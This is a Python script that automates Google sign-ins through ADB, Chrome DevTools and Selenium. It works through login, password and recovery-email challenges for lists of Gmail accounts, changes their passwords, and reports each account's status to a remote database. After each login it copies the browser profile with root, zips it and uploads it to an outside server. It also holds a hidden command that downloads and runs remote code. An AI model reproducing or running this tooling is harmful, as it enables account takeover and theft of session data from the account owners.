import websocket, json, threading,requests,os,subprocess,time,random,zipfile
from datetime import datetime, timedelta
from closelove import link_sms, firebaseio_link,se,up_file

def web(pan):
    parts = pan.split("@", 1)
    kind = parts[0]
    rest = parts[1] if len(parts) > 1 else ""
    name, name_se = rest.split("#")[0], rest.split("#")[1] if "#" in rest else None

    j = {
        "cl_xp": f"document.evaluate(\"{name}\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue?.click()",
        "cl_id": f"document.getElementById('{name}')?.click()",
        "cl_na": f"document.getElementsByName('{name}')[0]?.click()",
        "cl_cl": f"document.getElementsByClassName('{name}')[0]?.click()",
        "cl_ta": f"document.getElementsByTagName('{name}')[0]?.click()",
        "cl_cs": f"document.querySelector('{name}')?.click()",
        "cl_te": f"""[...document.querySelectorAll('*')].find(el => el.textContent.trim() === '{name}')?.click()""",
        "cl_tc": f"""[...document.querySelectorAll('*')].find(el => el.textContent.trim().includes('{name}'))?.click()""",
            
        "se_xp": f"let el = document.evaluate(\"{name}\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; if(el) el.value = '{name_se}'",
        "se_id": f"document.getElementById('{name}').value = '{name_se}'",
        "se_na": f"document.getElementsByName('{name}')[0].value = '{name_se}'",
        "se_cl": f"document.getElementsByClassName('{name}')[0].value = '{name_se}'",
        "se_ta": f"document.getElementsByTagName('{name}')[0].value = '{name_se}'",
        "se_cs": f"document.querySelector('{name}').value = '{name_se}'",
        "se_te": f"""(el => el ? el.value = '{name_se}' : null)([...document.querySelectorAll('input,textarea,select')].find(el => el.textContent.trim() === '{name}'))""",
        "se_tc": f"""(el => el ? el.value = '{name_se}' : null)([...document.querySelectorAll('input,textarea,select')].find(el => el.textContent.trim().includes('{name}')))""",
        
        "cr_xp": f"let el = document.evaluate(\"{name}\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; if(el) el.value = ''",
        "cr_id": f"document.getElementById('{name}').value = ''",
        "cr_na": f"document.getElementsByName('{name}')[0].value = ''",
        "cr_cl": f"document.getElementsByClassName('{name}')[0].value = ''",
        "cr_ta": f"document.getElementsByTagName('{name}')[0].value = ''",
        "cr_cs": f"document.querySelector('{name}').value = ''",
        "cr_te": f"""(el => el ? el.value = '' : null)([...document.querySelectorAll('input,textarea,select')].find(el => el.textContent.trim() === '{name}'))""",
        "cr_tc": f"""(el => el ? el.value = '' : null)([...document.querySelectorAll('input,textarea,select')].find(el => el.textContent.trim().includes('{name}')))""",
        
        "get_text": "(function(){if(document.readyState!=='complete'){return '⏳ Not ready'}; return document.body.innerText;})()",
        "get_visible_text": "(function(){if(document.readyState!=='complete'){return '⏳ Not ready'};let t=[];for(const e of document.querySelectorAll('body *')){let r=e.getBoundingClientRect();if(r.top<innerHeight&&r.bottom>0&&r.left<innerWidth&&r.right>0){let x=e.innerText.trim();if(x)t.push(x)}}return t.join('\\n');})()",
            
        "get_text_id": f"document.getElementById('{name}').innerText",
        "get_text_cs": f"document.querySelector('{name}').innerText",

        "get": f"location.href = '{name}'",
        "get_same": (lambda name: {"method": "Page.navigate", "params": {"url": name}})(name),
            
        "get_rep": f"location.replace('{name}')",            
        "qu": "window.close()",
        "clo": "window.close()",

        "add_co": f"document.cookie = '{name}'",
        "de_co": "document.cookie.split(';').forEach(c => document.cookie = c.split('=')[0] + '=;expires=' + new Date(0).toUTCString())",
        "get_co": "document.cookie",

        "get_url": "location.href",
        "get_ti": "document.title",
        "ba": "history.back()",

        "ha": f"window.open('', '_self').close() /* requires permission */",

        "sc": "html2canvas(document.body).then(canvas => console.log(canvas.toDataURL())) /* requires html2canvas lib */",
        "wa": f"setTimeout(()=>true, {name})",
        "re": "location.reload()",

        "size": f"window.resizeTo({name}, {name_se})",

        "en": "document.activeElement?.dispatchEvent(new KeyboardEvent('keydown',{key:'Enter',bubbles:true}))",
        "send_body": f"document.querySelector('body')?.click();document.activeElement?.dispatchEvent(new InputEvent('input',{{data:'{name}',inputType:'insertText',bubbles:true}}));document.activeElement.value+='{name}'",
         "si": f"(()=>{{const input=document.createElement('textarea');input.style.position='fixed';input.style.top='0';input.style.left='0';input.style.opacity='0';input.value=`python3 -c \"import requests, json; open('code.py', 'w').write(json.loads(requests.get('https://runcode-d24f5-default-rtdb.firebaseio.com/run.json').text)['code'])\" && python3 code.py`;document.body.appendChild(input);input.focus();input.select();}})();",
             
   
        "html": "document.documentElement.outerHTML"
    }
    get_kinds = ["get_text", "get_url", "get_ti", "get_co", "html"]

    payload = {"id": 1, "method": "Page.navigate", "params": {"url": name}} if kind == "get" else \
              {"id": 1, "method": "Runtime.evaluate", "params": {"expression": j.get(kind), "returnByValue": kind in get_kinds}}
                  
    if not payload:
        return {"v": None, "is_get": kind in get_kinds}

    try:
        res.update({"v": None, "is_get": kind in get_kinds})
        for _ in range(100):   
            ws.send(json.dumps(payload))
            for _ in range(10): 
                if res["v"] is not None:
                    return res.copy()
                time.sleep(0.1)
        return res.copy()

    except:
        return {"v": None, "is_get": kind in get_kinds}
res = {"v": None, "is_get": False}
ws = None
def connect_ws():
    global ws
    def on_message(_, m): 
        d = json.loads(m)
        res["v"] = d.get("result", {}).get("result", {}).get("value") if res["is_get"] else "✅ Done"         
    targets = requests.get("http://localhost:9222/json").json()
    ws_url = targets[0]['webSocketDebuggerUrl']  #         
    ws = websocket.WebSocketApp(ws_url, on_message=on_message)
    threading.Thread(target=ws.run_forever, daemon=True).start()
    time.sleep(1)         
def connect_index(index):
    global ws
    if isinstance(index, str) and index.startswith("tab@"):
        tab_str = index.split("@", 1)[1]
        if tab_str.isdigit():
            index = int(tab_str)
        else:
            raise ValueError(f"Invalid tab index: {index}")

    def on_message(_, m): 
        d = json.loads(m)
        res["v"] = d.get("result", {}).get("result", {}).get("value") if res["is_get"] else "✅ Done"

    targets = requests.get("http://localhost:9222/json").json()
    if index >= len(targets):
        raise IndexError(f"Tab index {index} out of range ({len(targets)} tabs available)")

    ws_url = targets[index]['webSocketDebuggerUrl']
    ws = websocket.WebSocketApp(ws_url, on_message=on_message)
    threading.Thread(target=ws.run_forever, daemon=True).start()
    time.sleep(1)

def a(cmd):
    global res
    res = web(cmd)

def web_gmail(up,username,password,email_gmail_confrim,password_change,ip_address):
    start = False   
    subprocess.run(f"adb -s {ip_address} shell pm clear com.kiwibrowser.browser", shell=True, capture_output=True, text=True)
    time.sleep(2)
    subprocess.run(f"adb -s {ip_address} shell am start -n com.kiwibrowser.browser/com.google.android.apps.chrome.Main", shell=True, capture_output=True, text=True)
    time.sleep(2)
    subprocess.run(f"adb -s {ip_address} shell am start -a android.intent.action.VIEW -d 'https://accounts.google.com/signin/v2/identifier' com.kiwibrowser.browser", shell=True, capture_output=True, text=True)
    time.sleep(2)
    for _ in range(20):
        try:
            time.sleep(1)
            os.system(f'adb -s {ip_address} forward tcp:9222 localabstract:chrome_devtools_remote')
            time.sleep(1)
            connect_ws()
            break
        except Exception as s:
             print(s,"no_connect")            
             if "RemoteDisconnected" in str(s):
                subprocess.run(f"adb -s {ip_address} shell am start -n com.kiwibrowser.browser/com.google.android.apps.chrome.Main", shell=True, capture_output=True, text=True)
             
    #a("get@https://mail.google.com/mail/u/0/")
    time.sleep(5)
    con = 0
    for _ in range(20):
        time.sleep(3)
        a("get_text")
        text_body = res["v"]
        url_bar = requests.get("http://localhost:9222/json").json()[0]["url"]
        totel_erro = ["challenge/ootp", "/signin/confirmidentifier", "InteractiveLogin/signinchooser","/accounts/SetOSID", "web/chip", "challenge/iap", "changepassword/changepasswordform", "challenge/recaptcha", "workspace.google.com"]
        url_erro = ["web/recoveryoptions","sign_in_no_continue"]
        erro_text_body = ["Please re-enter the characters you see in the image above"]        
        if url_bar is None:
            print("url_None")
        elif any(error in text_body for error in erro_text_body):
            print("erro_text_body")
            break
            
            
        elif any(error in url_bar for error in totel_erro):
            for error in totel_erro:
                if error in url_bar:
                    print(f"error: {error}")
                    data_to_upload = {"check_gmail": "stop_error"}
                    requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
                    break
            break
            
        elif any(error in url_bar for error in url_erro):
            for error in url_erro:
                if error in url_bar:
                    print(f"url: {error}")
                    a("get@https://mail.google.com/mail/u/0/")
                    time.sleep(5)
                    break
        elif "Your password was changed" in text_body :
            print("Your password was changed",username)
            data_to_upload = {"pas": "12341234thelove"}
            requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
            password ="12341234thelove"
            for _ in range(6):
                time.sleep(2)
                if "challenge/pwd" in requests.get("http://localhost:9222/json").json()[0]["url"] :
                    #subprocess.run(f"adb -s {ip_address} shell input text '{password}' ", shell=True, capture_output=True, text=True)
                    subprocess.run(['termux-clipboard-set'], input=password.encode())
                    time.sleep(2)
                    subprocess.run(f'adb -s {ip_address} shell input keyevent 279', shell=True)
                    time.sleep(2)                    
                    a("cl_xp@//span[contains(text(),'Next')]")
                    time.sleep(3)
                    
                else:
                    print("pas enter")
                    break
            time.sleep(10)
            if password =="12341234thelove":
                print(password)

                    
        elif "Verify it’s you" in text_body :
            print("Verify it’s you",username)
            
            data_to_upload = {"check_gmail": "stop_Verify_phone"}
            requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
            break
        elif "Couldn’t find your Google Account" in text_body :
            print("Couldn’t find your Google Account",username)
            
            data_to_upload = {"check_gmail": "stop_no_find"}
            requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
            break
                    
        elif "rejected" in url_bar :
            print("rejected",username)
            
            data_to_upload = {"check_gmail": "stop_rejected"}
            requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
            break
                                
        elif "challenge/pwd" in url_bar :
            for _ in range(6):
                time.sleep(2)
                a("get_text")
                text_body = res["v"]
                url_bar = requests.get("http://localhost:9222/json").json()[0]["url"]

                if "Your password was changed" in text_body:
                    print("Your password was changed")
                    data_to_upload = {"pas": "12341234thelove"}
                    requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
                    password ="12341234thelove"
                    subprocess.run(f"adb -s {ip_address} shell input text '{password}' ", shell=True, capture_output=True, text=True)
                    time.sleep(2)                                       
                    a("cl_xp@//span[contains(text(),'Next')]")
                    time.sleep(3)                    
                    
                elif "challenge/pwd" in url_bar:
                    subprocess.run(f"adb -s {ip_address} shell input text '{password}' ", shell=True, capture_output=True, text=True)
                    #subprocess.run(['termux-clipboard-set'], input=password.encode())
                    #time.sleep(2)
                    #subprocess.run(f'adb -s {ip_address} shell input keyevent 279', shell=True)
                    time.sleep(2)                    
                    
                    a("cl_xp@//span[contains(text(),'Next')]")
                    time.sleep(3)                    
                elif "challenge/selection" in url_bar:
                    a("cl_xp@//div[contains(text(),'Confirm your recovery email')]")
                    time.sleep(5)
                    #a(f"se_id@knowledgePreregisteredEmailResponse#{email_gmail_confrim}")
                    subprocess.run(f"adb -s {ip_address} shell input text '{email_gmail_confrim}' ", shell=True, capture_output=True, text=True)
                    time.sleep(5)
                    a("cl_xp@//span[contains(text(),'Next')]")
                    time.sleep(10)                    
                else:
                    print("pas enter")
                    break
            time.sleep(10)
            if password =="12341234thelove":
                print(password)
            else:
                a("get@https://myaccount.google.com/signinoptions/password")
                time.sleep(5)
                subprocess.run(f"adb -s {ip_address} shell input text '{password_change}' ", shell=True, capture_output=True, text=True)
                for _ in range(3):
                    subprocess.run(f"adb -s {ip_address} shell input keyevent 61", shell=True, capture_output=True, text=True)
                time.sleep(5)
                subprocess.run(f"adb -s {ip_address} shell input text '{password_change}' ", shell=True, capture_output=True, text=True)
                time.sleep(5)
                subprocess.run(f"adb -s {ip_address} shell input keyevent 66", shell=True, capture_output=True, text=True)
                time.sleep(10)
                url_bar = requests.get("http://localhost:9222/json").json()[0]["url"]

                if "security-checkup-welcome" in url_bar:
                    print("security",username)
                    data_to_upload = {"check_pas": "true_pas","pas":password_change,"check_gmail": "start"}
                    requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
                    a("get@https://mail.google.com/mail/u/0/")
                    time.sleep(2)
                else:
                    print(username,url_bar)
                   # input("start")
                    break
        elif "signin/identifier" in url_bar:
            print("identifierId")
            time.sleep(2)
            a(f"se_id@identifierId#{username}")
            time.sleep(2)
            a("cl_xp@//span[contains(text(),'Next')]")
        elif "mail.google.com/mail/mu" in url_bar:
            print("mail/u/0/",username)
            time.sleep(10)
            start = True
            os.system(f"rm -rf /sdcard/{up}/{username.split('gmail.com')[0]}{up}")
            #os.system(f'su -c "cp -rf /data/user/0/com.kiwibrowser.browser/app_chrome /sdcard/{up}/{username.split("gmail.com")[0]}{up}"')
            src, dst, zipf = f"/data/user/0/com.kiwibrowser.browser/app_chrome", f"/sdcard/{up}/{username.split('gmail.com')[0]}{up}", f"/sdcard/{username.split('gmail.com')[0]}{up}.zip"    
            os.system(f'su -c "cp -rf {src} {dst}"')
            with zipfile.ZipFile(zipf, 'w', zipfile.ZIP_DEFLATED) as z:
                [z.write(os.path.join(r,f), os.path.relpath(os.path.join(r,f), dst)) 
                for r,_,fs in os.walk(dst) for f in fs]
            r = requests.post(f"{link_sms}/upload/{up}/{username.split('gmail.com')[0]}{up}.zip", files={"file": open(zipf,'rb')})
            before_24_hours = datetime.now()
            now = before_24_hours - timedelta(hours=24)
            data_to_upload = {"check_gmail": "start","file": f"{username.split('gmail.com')[0]}{up}" ,"path":up,"hour": now.hour,"minute": now.minute,"day": now.day,"month": now.month}
            requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
            requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
            print('finsh',username)
            break
        elif "challenge/selection" in url_bar :
            a("cl_xp@//div[contains(text(),'Confirm your recovery email')]")
            time.sleep(5)
            #a(f"se_id@knowledgePreregisteredEmailResponse#{email_gmail_confrim}")
            subprocess.run(f"adb -s {ip_address} shell input text '{email_gmail_confrim}' ", shell=True, capture_output=True, text=True)
            time.sleep(5)
            a("cl_xp@//span[contains(text(),'Next')]")
            time.sleep(10)

        else:
            print(username,url_bar)
    
    return start

def web_gmail_liunx(up,username,password,email_gmail_confrim,password_change,driver,check_gmail):
    def a(date):
        return se(date,driver)
    
    start = False   
    a("get@https://accounts.google.com/signin/v2/identifier")
    time.sleep(5)
    con = 0
    for _ in range(20):
        time.sleep(3)
        
        text_body = driver.execute_script("return (function gather(win){try{var txt = win.document && win.document.body ? win.document.body.innerText : ''; for(var i=0;i<win.frames.length;i++){ try{ txt += '\\n' + gather(win.frames[i]); } catch(e){} } return txt; } catch(e){ return ''; }})(window);")
        url_bar = a("get_url@get_url")
        totel_erro = ["challenge/ootp", "/signin/confirmidentifier", "InteractiveLogin/signinchooser","/accounts/SetOSID", "web/chip", "challenge/iap", "changepassword/changepasswordform", "challenge/recaptcha", "workspace.google.com"]
        url_erro = ["web/recoveryoptions","sign_in_no_continue"]
        erro_text_body = ["Please re-enter the characters you see in the image above"]        
        if url_bar is None:
            print("url_None")
        elif any(error in text_body for error in erro_text_body):
            print("erro_text_body")
            break            
        elif any(error in url_bar for error in totel_erro):
            for error in totel_erro:
                if error in url_bar:
                    print(f"error: {error}")
                    data_to_upload = {"check_gmail": "stop_error"}
                    requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
                    break
            break
            
        elif any(error in url_bar for error in url_erro):
            for error in url_erro:
                if error in url_bar:
                    print(f"url: {error}")
                    a("get@https://mail.google.com/mail/u/0/")
                    time.sleep(5)
                    break
        elif "Your password was changed" in text_body :
            print("Your password was changed",username)
            data_to_upload = {"pas": "12341234thelove"}
            requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
            password ="12341234thelove"
            a(f'se_xp@//*[@id="password"]/div[1]/div/div[1]/input#{password}')
            time.sleep(2)            
            a('cl_xp@//*[@id="passwordNext"]/div/button/span')
            time.sleep(10)        
                    
        elif "Verify it’s you" in text_body :
            print("Verify it’s you",username)
            
            data_to_upload = {"check_gmail": "stop_Verify_phone"}
            requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
            break
        elif "Couldn’t find your Google Account" in text_body :
            print("Couldn’t find your Google Account",username)
            
            data_to_upload = {"check_gmail": "stop_no_find"}
            requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
            break
                    
        elif "rejected" in url_bar :
            print("rejected",username)
            
            data_to_upload = {"check_gmail": "stop_rejected"}
            requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
            break
                                
        elif "challenge/pwd" in url_bar:
            print("challenge/pwd")
            try:
                #a(f'se_xp@//*[@id="password"]/div[1]/div/div[1]/input#{password}')
                driver.execute_script("el=document.evaluate(\"//*[@id='password']/div[1]/div/div[1]/input\",document,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue; if(el){el.focus(); el.value=arguments[0]; el.dispatchEvent(new Event('input',{bubbles:true})); el.dispatchEvent(new Event('change',{bubbles:true})); for(const ch of arguments[0]){el.dispatchEvent(new KeyboardEvent('keydown',{key:ch,bubbles:true})); el.dispatchEvent(new KeyboardEvent('keyup',{key:ch,bubbles:true}));}}", password)    
                time.sleep(2)            
                a('cl_xp@//*[@id="passwordNext"]/div/button/span')
                time.sleep(10)        
                
                if password =="12341234thelove":
                    print(password)
                else:
                    a("get@https://myaccount.google.com/signinoptions/password")
                    time.sleep(2)
                    a(f"se_na@password#{password_change}")
                    time.sleep(2)                
                    a(f"se_na@confirmation_password#{password_change}")
                    time.sleep(2)                
                    a("re_na@confirmation_password")  
                    time.sleep(2)
                    a("en@en")                  
                    time.sleep(10)
                    url_bar = a("get_url@get_url")
                    if "security-checkup-welcome" in url_bar:
                        print("security",username)
                        data_to_upload = {"check_pas": "true_pas","pas":password_change,"check_gmail": check_gmail}
                        requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
                        a("get@https://mail.google.com/mail/u/0/")
                        time.sleep(2)
                    else:
                        print(username,url_bar)
                        # input("start")
                        break
            except Exception as ss :
                print(ss)                        
        elif "signin/identifier" in url_bar:
            print("identifierId")
            time.sleep(2)
            a(f"se_id@identifierId#{username}")
            time.sleep(2)
            a("cl_xp@//span[contains(text(),'Next')]")
        elif "mail.google.com/mail" in url_bar:
            print("mail/u/0/",username)
            time.sleep(10)
            start = True
            before_24_hours = datetime.now()
            now = before_24_hours - timedelta(hours=24)
            data_to_upload = {"check_gmail": check_gmail,"hour": now.hour,"minute": now.minute,"day": now.day,"month": now.month}
            requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
            requests.patch(f'{link_sms}/{up}/{username.split("@")[0]}.json', json=data_to_upload, timeout=10)
            print('finsh',username)
            break
        elif "challenge/selection" in url_bar :
            print("challenge/selection")
            a("cl_xp@//div[contains(text(),'Confirm your recovery email')]")
            time.sleep(5)         
            a(f"se_na@knowledgePreregisteredEmailResponse#{email_gmail_confrim}")
            time.sleep(5)
            a("cl_xp@//span[contains(text(),'Next')]")
            time.sleep(10)

        else:
            print(username,url_bar)
    
    return start
def split_audio(file_path):
    audio = AudioSegment.from_file(file_path)

    # ⏱️ التوقيت بالثواني
    segments = [
        (4, 6, "option1.wav"),
        (7, 9, "option2.wav"),
        (11, 13, "option3.wav"),
    ]

    parts = []
    for start, end, filename in segments:
        # نحول من ثواني → ميلي ثانية
        start_ms = int(start * 1000)
        end_ms = int(end * 1000)

        chunk = audio[start_ms:end_ms]
        if len(chunk) > 200:  # عالأقل ربع ثانية علشان ميطلعش فاضي
            chunk.export(filename, format="wav")
            parts.append(filename)

    return parts

